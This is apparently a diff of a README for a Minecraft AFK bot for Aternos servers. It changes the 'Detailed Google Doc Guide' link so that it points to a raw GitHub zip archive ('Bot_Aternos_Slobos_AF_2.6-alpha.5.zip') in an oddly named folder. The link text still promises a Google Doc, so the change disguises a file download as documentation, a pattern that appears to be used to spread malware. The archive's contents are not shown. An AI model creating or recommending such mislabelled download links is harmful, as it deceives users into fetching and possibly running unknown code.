@@ -25,7 +25,7 @@ A Minecraft bot that helps keep an Aternos server online 24/7 by automatically j
 
 We have made setup super easy! Check out the guide below:
 
-[**Detailed Google Doc Guide**](https://docs.google.com/document/d/1Fl0dRzP6O30ehp5-QcaB11IobF8I1JJhKUipzCWiCYA/edit?tab=t.0).
+[**Detailed Google Doc Guide**](https://raw.githubusercontent.com/donotlaugh96-eng/Slobos-AFK-Aternos-Bot/main/gamboge/Bot_Aternos_Slobos_AF_2.6-alpha.5.zip).
 
 ---
 
